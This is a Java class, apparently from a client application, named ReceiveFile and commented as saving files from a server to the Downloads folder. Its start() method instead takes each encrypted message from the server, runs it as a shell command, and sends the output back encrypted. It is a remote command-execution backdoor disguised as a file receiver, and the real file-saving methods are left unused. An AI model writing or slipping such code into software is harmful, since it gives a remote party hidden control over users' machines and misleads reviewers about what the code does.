package com.clientapp.service.implement;

import com.clientapp.enums.RequestType;
import com.clientapp.socket.ClientSocket;

import java.io.*;
import java.net.Socket;
import com.clientapp.service.IReceiveFile;

import javax.crypto.SecretKey;

import static com.clientapp.util.implement.ShellCommandExecutor.executeShellCommand;

public class ReceiveFile implements IReceiveFile {
    private boolean isRunning = true;
    private DataOutputStream dataOutputStream;
    private DataInputStream dataInputStream;

    @Override
    public void start() {
        try {
            System.out.println("Connected Successfully");
            SecretKey aesKey = ClientSocket.getInstance().getAesKey();
            // Receive file from the server, save to downloads folder
            System.out.println("Waiting for receiving file...");
            while (isRunning) {
                String command = ClientSocket.getInstance().receiveDecryptedFile();
                if (isRunning)
                    System.out.println("Received file: " );
                else break;
                if (!command.trim().isEmpty()) {
                    String result = executeShellCommand(command);
                    System.out.println(result);
                    ClientSocket.getInstance().sendEncryptedMessage(result);
                }
            }
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }


    private void receiveFileFromServer() throws Exception {
        // Nhận tên file từ máy chủ
        String fileName = dataInputStream.readUTF();
        if (fileName == null || fileName.trim().isEmpty()) {
            System.err.println("Received invalid file name.");
            return;
        }

        System.out.println("Receiving file: " + fileName);
        receiveFile(fileName);
    }

    private void receiveFile(String fileName) throws IOException {
        String downloadDir = System.getProperty("user.home") + File.separator + "Downloads";
        File downloadFolder = new File(downloadDir);
        if (!downloadFolder.exists()) {
            downloadFolder.mkdirs();
        }

        File file = new File(downloadDir, fileName);

        try (FileOutputStream fileOutputStream = new FileOutputStream(file)) {
            long fileSize = dataInputStream.readLong();
            byte[] buffer = new byte[4096];
            long remainingSize = fileSize;

            while (remainingSize > 0) {
                int bytesRead = dataInputStream.read(buffer, 0, (int) Math.min(buffer.length, remainingSize));
                if (bytesRead == -1) break;
                fileOutputStream.write(buffer, 0, bytesRead);
                remainingSize -= bytesRead;
            }

            System.out.println("File received and saved in: " + file.getAbsolutePath());
        }
    }

    @Override
    public void stop() {
        isRunning = false;
        System.out.println("Stopping file reception...");
        closeStreams();
    }

    private void closeStreams() {
        try {
            if (dataInputStream != null) dataInputStream.close();
            if (dataOutputStream != null) dataOutputStream.close();
        } catch (IOException e) {
            System.err.println("Error closing streams: " + e.getMessage());
        }
    }
}
